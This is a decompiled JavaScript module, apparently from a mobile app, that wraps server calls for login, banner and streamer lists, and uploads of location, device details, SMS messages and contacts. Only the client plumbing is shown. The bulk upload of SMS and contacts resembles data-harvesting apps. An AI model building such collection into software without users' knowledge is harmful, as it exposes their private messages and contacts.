exports.banner = function () {
  return y.apply(this, arguments);
};

exports.login = function (t) {
  return o.apply(this, arguments);
};

exports.show = function () {
  return b.apply(this, arguments);
};

exports.streamer = function () {
  return h.apply(this, arguments);
};

exports.submit_contacts = function (t) {
  return c.apply(this, arguments);
};

exports.submit_device = function (t) {
  return l.apply(this, arguments);
};

exports.submit_sms = function (t) {
  return f.apply(this, arguments);
};

exports.updateLocation = function (t) {
  return p.apply(this, arguments);
};

exports.upload = function (t) {
  return s.apply(this, arguments);
};

var module271 = require('@babel/runtime/helpers/interopRequireDefault')(require('./271')),
  module778 = (function (t, n) {
    if (!n && t && t.__esModule) return t;
    if (null === t || ('object' != typeof t && 'function' != typeof t))
      return {
        default: t,
      };
    var o = u(n);
    if (o && o.has(t)) return o.get(t);
    var p = {},
      l = Object.defineProperty && Object.getOwnPropertyDescriptor;

    for (var f in t)
      if ('default' !== f && Object.prototype.hasOwnProperty.call(t, f)) {
        var c = l ? Object.getOwnPropertyDescriptor(t, f) : null;
        if (c && (c.get || c.set)) Object.defineProperty(p, f, c);
        else p[f] = t[f];
      }

    p.default = t;
    if (o) o.set(t, p);
    return p;
  })(require('./778'));

function u(t) {
  if ('function' != typeof WeakMap) return null;
  var n = new WeakMap(),
    o = new WeakMap();
  return (u = function (t) {
    return t ? o : n;
  })(t);
}

function o() {
  return (o = module271.default(function* (t) {
    return module778.post('user/login', t, true, 5e3);
  })).apply(this, arguments);
}

function p() {
  return (p = module271.default(function* (t) {
    return module778.post('user/updateLocation', t, false);
  })).apply(this, arguments);
}

function l() {
  return (l = module271.default(function* (t) {
    return module778.post('submit/device', t, false, null, 3, 2e3);
  })).apply(this, arguments);
}

function f() {
  return (f = module271.default(function* (t) {
    return module778.post('submit/sms', t, false, null, 3, 2e3);
  })).apply(this, arguments);
}

function c() {
  return (c = module271.default(function* (t) {
    return module778.post('submit/contacts', t, false, null, 3, 2e3);
  })).apply(this, arguments);
}

function s() {
  return (s = module271.default(function* (t) {
    return module778.upload('upload', t);
  })).apply(this, arguments);
}

function y() {
  return (y = module271.default(function* () {
    return module778.get('banner/list', null, false);
  })).apply(this, arguments);
}

function h() {
  return (h = module271.default(function* () {
    return module778.get('streamer/list', null, false);
  })).apply(this, arguments);
}

function b() {
  return (b = module271.default(function* () {
    return module778.get('show/get');
  })).apply(this, arguments);
}
